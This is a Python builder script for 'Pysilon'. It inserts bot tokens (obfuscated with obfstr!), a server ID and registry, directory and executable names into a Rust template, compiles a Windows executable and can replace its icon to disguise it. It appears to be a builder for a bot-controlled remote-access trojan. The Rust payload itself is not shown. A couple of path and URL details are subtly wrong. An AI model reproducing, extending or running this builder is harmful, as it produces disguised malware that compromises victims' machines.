import subprocess, urllib.request, os, sys, secrets
from PIL import Image
def get_platform():
    try:
        import platform
        return 64 if platform.architecture()[0] == '64bit' else 32
    except:
        pass
    try:
        import struct
        return struct.calcsize("P") * 8
    except:
        pass
    try:
        import ctypes
        return ctypes.sizeof(ctypes.c_voidp) * 8
    except:
        pass
    try:
        import sys
        return 64 if sys.maxsize> 2 ** 32 else 32
    except:
        pass
    return 32 # Default to 32 (is this safe?)
def main():
    args= sys.argv[1:]
    if len(args)== 0:
        print("Pysilon Builder (CLI)")
        print("    Use -h or --help to show the help menu!")
        print("    Tip: run it as \"python builder.py <commands go here>\"!")
        return
    if args[0]== "--help" or args[0]== "-h":
        print("Pysilon Builder (CLI)")
        print("    --help, -h: Shows this help guide")
        print("    --tokens, -t: Sets the token(s) for the bot")
        print("    --registry, -r: Set the registry name")
        print("    --directory, -d: Set the directory name")
        print("    --executable, -e: Set the executable name")
        print("    --output, -o: Set the final (output) executable name")
        print("    --server, -s: Set the server ID")
        print("    --icon, -i: Set the final (output) executable icon")
        print("    --build32, -b32: Build to 32 bits")
        print("    --build64, -b64: Build to 64 bits")
        return
    i= 0
    mode= ""
    registry_name= ""
    directory_name= ""
    executable_name= ""
    output_name= ""
    do_icon= False
    server_id= -1
    tokens= []
    build= get_platform()
    while i< len(args):
        if mode== "":
            if args[i]== "-t" or args[i]== "--tokens":
                mode= "t"
            elif args[i]== "-r" or args[i]== "--registry":
                mode= "r"
            elif args[i]== "-d" or args[i]== "--directory":
                mode= "d"
            elif args[i]== "-e" or args[i]== "--executable":
                mode= "e"
            elif args[i]== "-o" or args[i]== "--output":
                mode= "o"
            elif args[i]== "-s" or args[i]== "--server":
                mode= "s"
            elif args[i]== "-i" or args[i]== "--icon":
                mode= "i"
            elif args[i]== "--build32" or args[i]== "-b32":
                build= 32
            elif args[i]== "--build64" or args[i]== "-b64":
                build= 64
        elif mode== "t":
            if args[i][0]!= "-":
                tokens.append(args[i])
            else:
                i-= 1
                mode= ""
        elif mode== "r":
            registry_name= args[i]
            mode= ""
        elif mode== "d":
            directory_name= args[i]
            mode= ""
        elif mode== "e":
            executable_name= args[i]
            if output_name== "":
                output_name= executable_name
            mode= ""
        elif mode== "o":
            output_name= args[i]
            if executable_name== "":
                executable_name= output_name
            mode= ""
        elif mode== "s":
            server_id= int(args[i])
            mode= ""
        elif mode== "i":
            with Image.open(args[i]) as image:
                image.save("icon.ico", "ICO")
            mode= ""
            do_icon= True
        i+= 1
    try:
        subprocess.run(["cargo"], stdout= subprocess.DEVNULL)
    except FileNotFoundError:
        url= "https://static.rust-lang.org/rustup/dist/x86_64-pc-windows-msvc/rustup-init.exe"
        if get_platform()== 32:
            url= "https://static.rust-lang.org/rustup/dist/x86_64-pc-windows-msvc/rustup-init.exe"
        request= urllib.request.urlopen(url)
        data= request.read()
        f= open("rustup-init.exe", "wb")
        f.write(data)
        f.close()
        subprocess.run(["rustup-init.exe", "-q", "-y", "-t", "i686-pc-windows-msvc", "x86_64-pc-windows-msvc"], stdout= subprocess.DEVNULL, stderr= subprocess.DEVNULL, stdin= subprocess.DEVNULL)
        os.remove("rustup-init.exe")
    if len(tokens)== 0:
        print("You need to have at least 1 token!")
        return
    if registry_name== "":
        print("The registry name can't be empty!")
        return
    if directory_name== "":
        print("The directory name can't be empty!")
        return
    if executable_name== "":
        print("The executable name can't be empty!")
        return
    if server_id< 0:
        print("You need to have a server ID! (The ID should be greater than 0)")
        return
    text= ""
    path= sys.path[0] + "\\"
    f= open("template_main.rs", "r", encoding= "utf-8")
    for linenum, line in enumerate(f):
        if "static SERVER_ID: Lazy<Mutex<u64>>= Lazy::new(|| Mutex::new(0))" in line:
            text+= line.replace("Lazy::new(|| Mutex::new(0))", f"Lazy::new(|| Mutex::new({server_id}))")
        elif "static SOFTWARE_REGISTRY_NAME: Lazy<Mutex<String>>= Lazy::new(|| Mutex::new(\"REGISTRY NAME GOES HERE\".into()));" in line:
            text+= line.replace("\"REGISTRY NAME GOES HERE\"", f"\"{registry_name}\"")
        elif "static SOFTWARE_DIRECTORY_NAME: Lazy<Mutex<String>>= Lazy::new(|| Mutex::new(\"DIRECTORY NAME GOES HERE\".into()));" in line:
            text+= line.replace("\"DIRECTORY NAME GOES HERE\"", f"\"{directory_name}\"")
        elif "static SOFTWARE_EXECUTABLE_NAME: Lazy<Mutex<String>>= Lazy::new(|| Mutex::new(\"EXECUTABLE NAME GOES HERE\".into()));" in line:
            text+= line.replace("\"EXECUTABLE NAME GOES HERE\"", f"\"{executable_name}\"")
        elif "obfstr!(\"TOKEN GOES HERE\")" in line:
            for token in tokens:
                text+= line.replace("obfstr!(\"TOKEN GOES HERE\")", f"obfstr!(\"{token}\")")
        else:
            text+= line
    f.close()
    f= open("../src/main.rs", "w", encoding= "utf-8")
    f.write(text)
    f.close()
    key= secrets.token_bytes(1 << 20) # 1 MiB
    f= open("../src/key.pysilon", "wb")
    f.write(key)
    f.close()
    final= path; final+= ".."; final+= "\\target\\"; final+= "i686-pc-windows-msvc" if build== 32 else "x86_64-pc-windows-msvc" + "\\release\\"
    target= path; target+= ".."; target+= "\\output\\"; target+= output_name; target+= "" if output_name.endswith(".exe") else ".exe";
    output= subprocess.run(["cmd", "/c", "@echo", "off", "&&", "cd", path + "..", "&&", "cargo", "build", "-r", "--target=i686-pc-windows-msvc" if build== 32 else "--target=x86_64-pc-windows-msvc"], stdout= subprocess.DEVNULL, stderr= subprocess.DEVNULL, stdin= subprocess.DEVNULL)
    if output.returncode== 0:
        print("Compiling OK")
    else:
        print("Error while compiling")
        return
    if do_icon:
        progargs= ["cmd", "/c", "@echo", "off", "&&", "cd", final, "&&", path + "rh.exe", "-open", "pysilon.exe", "-action", "addoverwrite", "-res", path + "icon.ico", "-mask", "ICONGROUP,MAINICON,", "-save", "pysilon.exe", "&&", "copy", "pysilon.exe", target]
    else:
        progargs= ["cmd", "/c", "@echo", "off", "&&", "cd", final, "&&", "copy", "pysilon.exe", target]
    output= subprocess.run(progargs, stdout= subprocess.DEVNULL, stderr= subprocess.DEVNULL, stdin= subprocess.DEVNULL)
    if output.returncode== 0:
        if do_icon:
            print("Changing icon OK")
        print("Copying the file OK")
    else:
        if do_icon:
            print("Error while changing icon")
        print("Error while copying the file")
        return
    start= path; start+= ".."; start+= "\\src\\key.pysilon"
    final= path; final+= ".."; final+= "\\output\\"; final+= output_name; final+= "-key.pysilon";
    output= subprocess.run(["cmd", "/c", "copy", start, final], stdout= subprocess.DEVNULL, stderr= subprocess.DEVNULL, stdin= subprocess.DEVNULL)
    if output.returncode== 0:
        print("Copying the key OK")
    else:
        print("Error while copying the key")
        return
main()